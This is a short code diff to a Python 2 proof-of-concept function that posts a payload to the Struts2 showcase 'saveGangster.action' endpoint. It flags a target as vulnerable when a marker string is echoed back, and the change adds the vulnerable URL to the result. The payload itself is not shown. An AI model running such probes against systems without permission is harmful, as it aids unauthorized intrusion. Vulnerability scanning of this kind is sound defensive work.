@@ -45,9 +45,11 @@ def Poc(url):
         }
         r = requests.post(url+'/struts2-showcase/integration/saveGangster.action', data=payload, timeout=5)
         if random_str in r.text and 'html' not in r.text:
+            result['message'] = url+'/struts2-showcase/integration/saveGangster.action'
             result['success'] = True
         r = requests.post(url + '/integration/saveGangster.action', data=payload, timeout=5)
         if random_str in r.text and 'html' not in r.text:
+            result['message'] = url + '/integration/saveGangster.action'
             result['success'] = True
         return result
     except Exception,e:
